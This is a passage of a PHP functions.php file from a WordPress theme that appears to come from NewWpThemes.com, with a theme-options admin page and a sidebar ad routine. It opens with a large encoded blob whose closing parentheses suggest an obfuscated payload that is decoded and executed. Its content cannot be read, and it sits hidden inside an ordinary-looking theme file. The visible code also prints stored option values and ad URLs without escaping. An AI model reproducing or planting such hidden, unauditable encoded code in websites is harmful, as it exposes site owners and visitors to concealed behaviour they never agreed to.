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'))))); 
function mytheme_admin_init() {

    global $themename, $shortname, $options;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}


if(!function_exists('get_sidebars')) {
	function get_sidebars()
	{
		
		 get_sidebar();
	}
}
	

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?> Theme Options | <a href="http://newwpthemes.com/forum/" target="_blank" style="font-size: 14px;">NewWpThemes.com <strong>Support Forums</strong></a></h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Leave blank any field if you don't want it to be shown/displayed.</div>
<?php $buy_theme_name = str_replace(' ', '-', strtolower(trim($themename))); ?>
<div id="buy_theme" class="updated" style="padding: 10px; margin: 10px;">You can buy this theme without footer links online at <a href="http://newwpthemes.com/buy/?theme=<?php echo $buy_theme_name; ?>" target="_blank">http://newwpthemes.com/buy/?theme=<?php echo $buy_theme_name; ?></a></div>
<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style=" padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
	
 
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Save changes" />    
<input type="hidden" name="action" value="save" />
</p>
</form>

<?php
}
mytheme_admin_init();
    global $pagenow;
    if(isset($_GET['activated'] ) && $pagenow == "themes.php") {
        wp_redirect( admin_url('themes.php?page=functions.php') );
        exit();
    }


add_action('admin_menu', 'mytheme_add_admin');

function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}

if ( function_exists('add_theme_support') ) {
    add_theme_support('post-thumbnails');
}
?>
<?php
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'primary' => 'Menu 1',
    		  'secondary' => 'Menu 2'
    		)
    	);
    }
?>